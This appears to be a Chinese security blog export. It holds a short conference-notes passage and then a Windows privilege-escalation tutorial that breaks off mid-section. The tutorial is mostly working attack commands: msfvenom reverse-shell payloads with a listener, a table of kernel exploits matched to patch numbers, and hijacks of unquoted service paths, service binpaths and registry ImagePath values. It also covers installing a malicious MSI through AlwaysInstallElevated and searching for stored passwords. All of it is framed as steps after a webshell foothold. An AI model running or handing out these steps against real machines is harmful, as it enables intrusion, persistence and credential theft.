title="sdc"></a>sdc</h3><p>什么智能摩托车进化之路、web3密钥托管挑战以及解决方案、工控系统攻击攻击揭秘、反编译引擎自动挖掘、安全内核的水密舱</p><p>然后就是大模型、大模型、大模型</p><p>大模型风险、挑战和未来</p><p>但是能看出来，目前公司的很多所谓大模型都是虚的，实际上借助的还是深度学习，机器学习一套。然后再提出小模型，以小模型与机器学习进行配合然后推出所谓的大模型产品，但实际上光靠大模型是不行的。大模型的实际落地和发展是不行的，但同时它的前景又是光明的，只是现在没有足够的资金去持续支持。</p><p>再加上大模型不断出现，公司如果针对一个大模型进行构建产品，过几天新的更强大的模型基础又出现了，需要不断去改基本模型，对于公司来说也不可承受。开发成本高并且效果距离稳定落地也有一段距离。</p><p>大模型技术在恶意软件的分析上面，有用，但不大。也是不能直接去分析二进制样本，会出很大问题。目前是相当于作为传统恶意样本分析的补充。不断去RAG微调参数，去减少对样本的重复性分析工作。比如不断的定位特征码位置等</p><h3 id="geekcon"><a href="#geekcon" class="headerlink" title="geekcon"></a>geekcon</h3><p>短信能随意伪造，真的震撼人心。这都只要知道了被害人的手机号，随意伪造官方信息，伪造链接。这要是在战争时期被利用，那会对社会产生巨大冲击。</p><p>通知清理不干净，供应链上的厂商自己在做恶意程序，薅用户羊毛</p><p>智能汽车，还能被顺走，帅！</p><p>google red team的分享没听懂</p><p>远程爆掉手机和ai挑战赛，由于出场给父母买礼物了，没看到，可惜</p><p>springboot之殇</p><p>介绍了很多java的漏洞和利用链，感觉就是需要对这个组件的代码以及特性很清楚才能挖出来。算是给我提供了一种新的思路。就是先熟悉组件再开始尝试挖洞(虽然像常识)</p><p>买手机送木马，等等很有意思</p><p>最让我感触的其实是吐槽大会。</p><p>大佬们在台上侃侃而谈，说这个行业是不是个好行业，给予期望，未来最后存在的就是安全行业。但实际上台下都在说不是好行业。哈哈哈哈哈</p><p>路途艰难遥远啊，道阻且长。我是抱有乐观心态。热爱，因为山就在那里</p>]]></content>
      
      
      
        <tags>
            
            <tag> 会议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权</title>
      <link href="/posts/d2fb2fe6444a/"/>
      <url>/posts/d2fb2fe6444a/</url>
      
        <content type="html"><![CDATA[<p>windows提权</p><p>linux提权</p><p>数据库提权</p><p>第三方软件提权</p><h1 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h1><p>提权到administrator、system权限</p><p>windows用户账户一般有：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">本地普通用户</span><br><span class="line">本地一般管理员</span><br><span class="line">本地最高管理员</span><br><span class="line">域内普通用户</span><br><span class="line">域内管理员</span><br></pre></td></tr></table></figure><p>本地普通用户：在windows电脑中本地新建的普通用户，没有管理员权限，新建用户一般都是user组</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="keyword">user</span> admin admin_123 <span class="keyword">add</span> <span class="operator">/</span><span class="operator">/</span>添加用户admin，密码是 admin_123</span><br></pre></td></tr></table></figure><p>本地普通用户在进行高权限操作时会出现需要管理员账号密码进行认证</p><p>本地管理员组内非administrator用户(本地普通用户)，一般来说电脑我们使用的时候都是在管理员组但非administrator用户，所以有道时候需要uac认证，或者以管理员身份运行软件</p><p>在windows11家庭版中administrator默认是隐藏关闭的，如果需要开启，则使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="keyword">user</span> administrator <span class="operator">/</span>active:yes</span><br></pre></td></tr></table></figure><p>system是服务账号的最高权限，administrator是用户账号的最高权限，任务管理器中是以system运行的一般都是系统自带的服务</p><p>一般拿到的就是webshell，然后通过传cs木马，上cs的shell，利用cs里面提权脚本进行提权，如ms15-051、过uac。。。然后也可以上msf。CS和msf各有优劣，msf的工具脚本会多一些而且很稳定，CS会更方便一些有图形化一键利用</p><h2 id="Windows系统内核溢出提权漏洞-可能会蓝屏"><a href="#Windows系统内核溢出提权漏洞-可能会蓝屏" class="headerlink" title="Windows系统内核溢出提权漏洞(可能会蓝屏)"></a>Windows系统内核溢出提权漏洞(可能会蓝屏)</h2><p>系统本身或系统中的软件漏洞获取windows操作系统的system权限，有本地溢出和远程溢出</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>信息收集，查看权限，查看版本，补丁</p><p>查看是否有可利用漏洞</p><p>根据漏洞找exp</p><p>用exp提权</p><h3 id="查信息"><a href="#查信息" class="headerlink" title="查信息"></a>查信息</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe <span class="keyword">get</span> caption,description,hotfixid,installedon</span><br></pre></td></tr></table></figure><h3 id="能查到补丁，然后根据对应的补丁漏洞进行提权"><a href="#能查到补丁，然后根据对应的补丁漏洞进行提权" class="headerlink" title="能查到补丁，然后根据对应的补丁漏洞进行提权"></a>能查到补丁，然后根据对应的补丁漏洞进行提权</h3><p>常见补丁漏洞对应表</p><p><a href="https://blog.csdn.net/qq_41060781/article/details/134613672">https://blog.csdn.net/qq_41060781/article/details/134613672</a></p><p>暂时无法在飞书文档外展示此内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">MS16-135 [KB3199135]  2016</span><br><span class="line"></span><br><span class="line">MS16-111 [KB3186973] (Windows 10 10586 (32/64)/8.1)</span><br><span class="line"></span><br><span class="line">MS16-098 [KB3178466] (Win 8.1)</span><br><span class="line"></span><br><span class="line">MS16-075 [KB3164038] (2003/2008/7/8/2012)</span><br><span class="line"></span><br><span class="line">MS16-034 [KB3143145] (2008/7/8/10/2012)</span><br><span class="line"></span><br><span class="line">MS16-032 [KB3143141] (2008/7/8/10/2012)</span><br><span class="line"></span><br><span class="line">MS16-016 [KB3136041] (2008/Vista/7)</span><br><span class="line"></span><br><span class="line">MS16-014 [K3134228] (2008/Vista/7)</span><br><span class="line"></span><br><span class="line">MS15-097 [KB3089656] (win8.1/2012)</span><br><span class="line"></span><br><span class="line">MS15-076 [KB3067505] (2003/2008/7/8/2012)</span><br><span class="line"></span><br><span class="line">MS15-077 [KB3077657] (XP/Vista/Win7/Win8/2000/2003/2008/2012)</span><br><span class="line"></span><br><span class="line">MS15-061 [KB3057839] (2003/2008/7/8/2012)</span><br><span class="line"></span><br><span class="line">MS15-051 [KB3057191] (2003/2008/7/8/2012)</span><br><span class="line"></span><br><span class="line">MS15-015 [KB3031432] (Win7/8/8.1/2012/RT/2012 R2/2008 R2)</span><br><span class="line"></span><br><span class="line">MS15-010 [KB3036220] (2003/2008/7/8)</span><br><span class="line"></span><br><span class="line">MS15-001 [KB3023266] (2008/2012/7/8)</span><br><span class="line"></span><br><span class="line">MS14-070 [KB2989935] -2003</span><br><span class="line"></span><br><span class="line">MS14-068              (2003/2008/2012/7/8)</span><br><span class="line"></span><br><span class="line">MS14-058 [KB3000061] (2003/2008/2012/7/8)</span><br><span class="line"></span><br><span class="line">MS14-066 [KB2992611]  (VistaSP2/7 SP1/8/Windows 8.1/2003 SP2/2008 SP2/2008 R2</span><br><span class="line"></span><br><span class="line">SP1/2012/2012 R2/Windows RT/Windows RT 8.1)</span><br><span class="line"></span><br><span class="line">MS14-040 [KB2975684] (2003/2008/2012/7/8)</span><br><span class="line"></span><br><span class="line">MS14-002 [KB2914368] (2003/XP)</span><br><span class="line"></span><br><span class="line">MS13-053 [KB2850851] (XP/Vista/2003/2008/win 7)</span><br><span class="line"></span><br><span class="line">MS13-046 [KB2840221] (Vista/2003/2008/2012/7)</span><br><span class="line"></span><br><span class="line">MS13-005 [KB2778930] (2003/2008/2012/win7/8)</span><br><span class="line"></span><br><span class="line">MS12-042 [KB2972621] (2008/2012/win7)</span><br><span class="line"></span><br><span class="line">MS12-020 [KB2671387] (2003/2008/7/XP)</span><br><span class="line"></span><br><span class="line">MS11-080 [KB2592799] (2003/XP)</span><br><span class="line"></span><br><span class="line">MS11-062 [KB2566454] (2003/XP)</span><br><span class="line"></span><br><span class="line">MS11-046 [KB2503665] (2003/2008/7/XP)</span><br><span class="line"></span><br><span class="line">MS11-011 [KB2393802] (2003/2008/7/XP/Vista)</span><br><span class="line"></span><br><span class="line">MS10-092 [KB2305420] (2008/7)</span><br><span class="line"></span><br><span class="line">MS10-065 [KB2267960] (IIS 5.1, 6.0, 7.0, and 7.5)</span><br><span class="line"></span><br><span class="line">MS10-059 [KB982799] (2008/7/Vista)</span><br><span class="line"></span><br><span class="line">MS10-048 [KB2160329] (XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp;</span><br><span class="line"></span><br><span class="line">R2/Win7)</span><br><span class="line"></span><br><span class="line">MS10-015 [KB977165] (2003/2008/7/XP)</span><br><span class="line"></span><br><span class="line">MS10-012 [KB971468] (Windows 7/2008R2)</span><br><span class="line"></span><br><span class="line">MS09-050 [KB975517] (2008/Vista)</span><br><span class="line"></span><br><span class="line">MS09-020 [KB970483] (IIS 5.1 and 6.0)</span><br><span class="line"></span><br><span class="line">MS09-012 [KB959454] (Vista/win7/2008/Vista)</span><br><span class="line"></span><br><span class="line">MS08-068 [KB957097] (2000/XP)</span><br><span class="line"></span><br><span class="line">MS08-067 [KB958644] (Windows 2000/XP/Server 2003/Vista/Server 2008)</span><br><span class="line"></span><br><span class="line">MS08-066 [KB956803] (Windows 2000/XP/Server 2003)</span><br><span class="line"></span><br><span class="line">MS08-025 [KB941693] (XP/2003/2008/Vista)</span><br><span class="line"></span><br><span class="line">MS06-040 [KB921883] (2003/xp/2000)</span><br><span class="line"></span><br><span class="line">MS05-039 [KB899588] (Win 9X/ME/NT/2000/XP/2003)</span><br><span class="line"></span><br><span class="line">MS03-026 [KB823980] (/NT/2000/XP/2003)</span><br></pre></td></tr></table></figure><p>或使用msf提权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="operator">-</span>a x86 <span class="comment">--platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.45.131 LPORT=7777 -f exe -o xxx.exe</span></span><br><span class="line">msfvenom <span class="operator">-</span>a x64 <span class="comment">--platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.131 LPORT=7777 -f exe -o xxx.exe</span></span><br><span class="line">use exploit<span class="operator">/</span>multi<span class="operator">/</span>handler</span><br><span class="line"><span class="keyword">set</span> payload windows<span class="operator">/</span>meterpreter<span class="operator">/</span>reverse_tcp</span><br><span class="line"><span class="keyword">set</span> lhost <span class="number">192.168</span><span class="number">.45</span><span class="number">.131</span></span><br><span class="line"><span class="keyword">set</span> lport <span class="number">7777</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>利用自动提权（很可能失败）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem   <span class="operator">/</span><span class="operator">/</span>一般是从管理员(administrator)提升到<span class="keyword">system</span>，如果是普通权限运行此命令会报错</span><br></pre></td></tr></table></figure><p>但是可以使用自动提权脚本</p><p>比如pwnkit或者是msf自带的enum_patches和local_exploit_suggester</p><p>上线到msf后，将session放后台，然后运行即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post<span class="operator">/</span>multi<span class="operator">/</span>recon<span class="operator">/</span>local_exploit_suggester</span><br><span class="line"><span class="keyword">set</span> session ID</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>然后跑出来用对应脚本提权即可</p><h4 id="Windows-exploit-suggester"><a href="#Windows-exploit-suggester" class="headerlink" title="Windows exploit suggester"></a>Windows exploit suggester</h4><p>暂时无法在飞书文档外展示此内容</p><p>放kali里面用python2运行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systeminfo <span class="operator">&gt;</span> systeminfo.txt</span><br><span class="line">python2 <span class="operator">-</span>m pip install xlrd<span class="operator">=</span><span class="operator">=</span><span class="number">1.2</span><span class="number">.0</span> 安装库文件、</span><br><span class="line">python2 windows<span class="operator">-</span>exploit<span class="operator">-</span>suggester.py <span class="comment">--update 更新库生成xls文件</span></span><br><span class="line">python2 windows<span class="operator">-</span>exploit<span class="operator">-</span>suggester.py <span class="comment">--database xls文件名 --systeminfo systeminfo.txt 对比信息查找漏洞</span></span><br></pre></td></tr></table></figure><h4 id="在线辅助提权"><a href="#在线辅助提权" class="headerlink" title="在线辅助提权"></a>在线辅助提权</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="operator">/</span><span class="operator">/</span>i.hacking8.com<span class="operator">/</span>tiquan</span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>bugs.hacking8.com<span class="operator">/</span>tiquan</span><br></pre></td></tr></table></figure><h5 id="wesng提权-更好的windows-exploit-suggester"><a href="#wesng提权-更好的windows-exploit-suggester" class="headerlink" title="wesng提权(更好的windows-exploit-suggester)"></a>wesng提权(更好的windows-exploit-suggester)</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python wes.py <span class="comment">--update</span></span><br><span class="line">python wes.py systeminfo.txt</span><br><span class="line">python wes.py systeminfo.txt <span class="comment">--impact &quot;Remote Code Execution&quot;</span></span><br><span class="line">python wes.py systeminfo.txt <span class="comment">--import &quot;Remote Code Execution&quot;</span></span><br></pre></td></tr></table></figure><h5 id="exp搜索"><a href="#exp搜索" class="headerlink" title="exp搜索"></a>exp搜索</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="operator">/</span><span class="operator">/</span>github.com<span class="operator">/</span>offensive<span class="operator">-</span>security<span class="operator">/</span>exploitdb</span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>www.exploit<span class="operator">-</span>db.com</span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>github.com<span class="operator">/</span>SecWiki<span class="operator">/</span>windows<span class="operator">-</span>kernel<span class="operator">-</span>exploits</span><br></pre></td></tr></table></figure><h2 id="Windows错误配置提权-另一些提权，但远远不如上面的好用，只是了解一些就好"><a href="#Windows错误配置提权-另一些提权，但远远不如上面的好用，只是了解一些就好" class="headerlink" title="Windows错误配置提权(另一些提权，但远远不如上面的好用，只是了解一些就好)"></a>Windows错误配置提权(另一些提权，但远远不如上面的好用，只是了解一些就好)</h2><p>概念：</p><p>查看是否存在错误系统配置，比如路径未加引号或未指定可执行文件路径等，导致运行程序命令的时候能被添加或截获命令</p><h3 id="Tusted-Service-Paths提权原理"><a href="#Tusted-Service-Paths提权原理" class="headerlink" title="Tusted Service Paths提权原理"></a>Tusted Service Paths提权原理</h3><p>windows服务通常使用system权限运行，系统解析服务的二进制文件对应的文件路径中空格的时候可以以系统权限进行解析。以系统权限执行</p><p>即如图</p><p><img src="/./../image/%E6%8F%90%E6%9D%83/1729157716074-12.png" alt="img"></p><p>此有引号并且里面有空格，如果说这里没有引号，并且有空格则可以进行利用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">服务路径没有用引号引起来</span><br><span class="line">服务路径中存在空格</span><br><span class="line">服务以最高权限启动后</span><br><span class="line">当前权限具有到对应目录下写文件</span><br></pre></td></tr></table></figure><p>微软服务路径寻找方法</p><p>例如C:\Program Files\Common Files\service.exe</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Program.exe    <span class="operator">/</span><span class="operator">/</span>寻找失败</span><br><span class="line">C:\Program Files\Common.exe <span class="operator">/</span><span class="operator">/</span>寻找失败</span><br><span class="line">C:\Program Files\Common Files\service.exe <span class="operator">/</span><span class="operator">/</span>寻找成功</span><br></pre></td></tr></table></figure><p>我们就在截断的那里写一个刚好同名的软件就行，就会以服务的权限去运行该文件</p><p>实验配置流程</p><p>创建一个服务，路径中存在空格，并且服务路径中没有引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc <span class="keyword">create</span> &quot;service&quot; binpath<span class="operator">=</span> &quot;C:\Program Files\Common Files\service\service.exe&quot; <span class="keyword">start</span><span class="operator">=</span>auto  <span class="operator">/</span><span class="operator">/</span>这里binpath后面是必须要有空格的</span><br></pre></td></tr></table></figure><p>查询服务的启动方式和权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc service</span><br></pre></td></tr></table></figure><p>查询是否有可写权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls &quot;C:&quot;</span><br></pre></td></tr></table></figure><p>赋予权限（本身就需要管理员才能加权限）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls &quot;C:&quot; <span class="operator">/</span><span class="keyword">grant</span> &quot;BUILTIN\Users&quot; :W </span><br></pre></td></tr></table></figure><h4 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h4><p>登上控制了的机器</p><p>使用命令查找有没有这样的服务</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service <span class="keyword">get</span> name,displayname,pathname,startmode <span class="operator">|</span> findstr <span class="operator">/</span>i &quot;Auto&quot; <span class="operator">|</span> findstr <span class="operator">/</span>i <span class="operator">/</span>v &quot;C:\\Windows\\&quot; <span class="operator">|</span> findstr <span class="operator">/</span>i <span class="operator">/</span>v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p>编译生成exe，将exe重命名并上传到相应目录</p><p>这里没有做自删除，可以需要做自删除的，或者再调用原来的ipconfig伪装一下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include<span class="operator">&lt;</span>stdio.h<span class="operator">&gt;</span></span><br><span class="line">#include<span class="operator">&lt;</span>stdlib.h<span class="operator">&gt;</span></span><br><span class="line"><span class="type">int</span> main()&#123;</span><br><span class="line">    <span class="keyword">system</span>(&quot;cmd.exe /c C:\\USERS\\xxxxx\\Desktop\\1.exe&quot;);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="path配置错误-鸡肋"><a href="#path配置错误-鸡肋" class="headerlink" title="path配置错误(鸡肋)"></a>path配置错误(鸡肋)</h3><p>和上面的差不多，只不过现在是放到环境变量中了，并且需要管理员去执行命令，才能上线</p><p>查找环境变量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic ENVIRONMENT <span class="keyword">where</span> &quot;name=&#x27;path&#x27;&quot; <span class="keyword">get</span> UserName , VariableValue</span><br></pre></td></tr></table></figure><h3 id="不安全的服务提权"><a href="#不安全的服务提权" class="headerlink" title="不安全的服务提权"></a>不安全的服务提权</h3><p>原理</p><p>以system权限运行</p><p>给服务设置权限，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subinacl <span class="operator">/</span>service xxxx <span class="operator">/</span><span class="keyword">grant</span><span class="operator">=</span>apache<span class="operator">=</span>F <span class="operator">/</span><span class="operator">/</span>将xxxx的服务赋予apache完全控制权</span><br></pre></td></tr></table></figure><h4 id="流程-2"><a href="#流程-2" class="headerlink" title="流程"></a>流程</h4><p>查看当前哪些服务配置不当</p><p>使用accesschk工具</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk <span class="operator">-</span>cw <span class="operator">*</span> <span class="operator">/</span>accepteula</span><br></pre></td></tr></table></figure><p>如果有服务在当前用户下，那么就可以通过修改当前服务的执行路径，使此服务执行我们的恶意程序</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config xxxx binpath<span class="operator">=</span> &quot;C:\\Users\xxx\desktop\1.exe&quot;</span><br></pre></td></tr></table></figure><h3 id="不安全注册表提权（需要有对注册表的修改权限）"><a href="#不安全注册表提权（需要有对注册表的修改权限）" class="headerlink" title="不安全注册表提权（需要有对注册表的修改权限）"></a>不安全注册表提权（需要有对注册表的修改权限）</h3><p>原理</p><p>windows的服务路径存储在windows的注册表中，如果注册表配置不当，攻击者发现可以使用低权限可以修改注册表的时候，就能提权，将imagepath修改为恶意文件，重启导致提权</p><p>实际上就算上一个提权方法的注册表形式修改</p><p>寻找到路径，然后修改其binpath即可</p><p>注册表中在这个目录下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;HKEY_LOCAL_MACHINE\system\ControlSet001\services\xxx&quot;</span><br><span class="line">subinacl <span class="operator">/</span>keyreg &quot;HKEY_LOCAL_MACHINE\system\ControlSet001\services\xxx&quot; <span class="operator">/</span><span class="keyword">grant</span><span class="operator">=</span>apache<span class="operator">=</span>f</span><br><span class="line">reg <span class="keyword">add</span> &quot;HKEY_LOCAL_MACHINE\system\ControlSet001\services\xxx&quot; <span class="operator">/</span>t REG_EXPANDSZ <span class="operator">/</span>v ImagePath <span class="operator">/</span>d &quot;C:\USERS\\apache\Desktop\1.exe&quot; <span class="operator">/</span>f</span><br></pre></td></tr></table></figure><p>查询是否成功替换</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_LOCAL_MACHINE\<span class="keyword">system</span>\ControlSet001\services\xxx <span class="operator">/</span>v imagepath</span><br></pre></td></tr></table></figure><h3 id="注册表键AlwaysInstall提权"><a href="#注册表键AlwaysInstall提权" class="headerlink" title="注册表键AlwaysInstall提权"></a>注册表键AlwaysInstall提权</h3><p><a href="https://blog.csdn.net/yangbz123/article/details/117196615">https://blog.csdn.net/yangbz123/article/details/117196615</a></p><p>注册表键是一个策略设置项，windows运行低权限用户以system权限安装文件，使用此策略设置项，所有权限用户都可以使用NT AUTHORITY\SYSTEM权限安装恶意MSI文件</p><p>应该是默认关闭的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer <span class="operator">/</span>v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer <span class="operator">/</span>v AlwaysInstallElevated</span><br></pre></td></tr></table></figure><p><img src="/./../image/%E6%8F%90%E6%9D%83/1729157716058-1.png" alt="img"></p><p>这就说明是没有</p><p>输入gpedit.msc，打开组策略管理器</p><p>计算机配置–&gt;模板管理–&gt;windows组件–&gt;windows installe，设置里面有永远以高权限安装，启用就行</p><p>用户配置–&gt;…………，也是一样，都需要进行操作</p><p>再进行查询，这样就说明有</p><p><img src="/./../image/%E6%8F%90%E6%9D%83/1729157716058-2.png" alt="img"></p><h4 id="流程-3"><a href="#流程-3" class="headerlink" title="流程"></a>流程</h4><h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><p>msf登录上电脑</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit<span class="operator">/</span>windows<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>always_install_elevated</span><br></pre></td></tr></table></figure><p>设置session后运行即可</p><p>如果失败了，可以使用msi生成文件上传上去</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="operator">-</span>p windows<span class="operator">/</span>meterpreter<span class="operator">/</span>reverse_tcp LHOST<span class="operator">=</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.131</span> LPORT<span class="operator">=</span><span class="number">123</span> <span class="operator">-</span>f msi <span class="operator">-</span>o payload.msi</span><br></pre></td></tr></table></figure><p>然后运行并监听即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">execute</span> &quot;msiexec.exe /quiet /qn /i payload.msi&quot;</span><br></pre></td></tr></table></figure><p>另外补充：</p><p>msf里面可以使用upload进行文件上传</p><p>比如需要上传xxx.exe</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter <span class="operator">&gt;</span>  upload xxx.exe</span><br></pre></td></tr></table></figure><h5 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h5><p>首先用cs生成一个木马,xxx.exe</p><p>然后使用工具exe2msi,将exe文件转成msi文件，然后再传到目标机器上运行上线</p><p>运行即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec.exe <span class="operator">/</span>quiet <span class="operator">/</span>qn <span class="operator">/</span>i xxx.msi</span><br></pre></td></tr></table></figure><h3 id="敏感文件泄露"><a href="#敏感文件泄露" class="headerlink" title="敏感文件泄露"></a>敏感文件泄露</h3><p>比如unattend.xml，应答文件，用于管理员自动分发安装电脑</p><p>在C:\Windows\Panther里面</p><p>里面就可能泄露账号密码，前面信息收集那章会有很全的信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir <span class="operator">/</span>s <span class="operator">*</span>pass<span class="operator">*</span> <span class="operator">=</span><span class="operator">=</span> <span class="operator">*</span>.config</span><br><span class="line">findst <span class="operator">/</span>si password <span class="operator">*</span>.xml <span class="operator">*</span>.ini <span class="operator">*</span>.txt</span><br></pre></td></tr></table></figure><p>如果说管理员曾经使用过runas &#x2F;savecred，比如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas <span class="operator">/</span>savecred <span class="operator">/</span><span class="keyword">user</span>:administrator cmd</span><br></pre></td></tr></table></figure><p>会将密码当作凭证，保留在电脑上</p><p>cmdkey &#x2F;list</p><p>如果查到了账号密码，用psexec就能上了</p><p>接前面的内网渗透</p><h3 id="计划任务提权"><a href="#计划任务提权" class="headerlink" 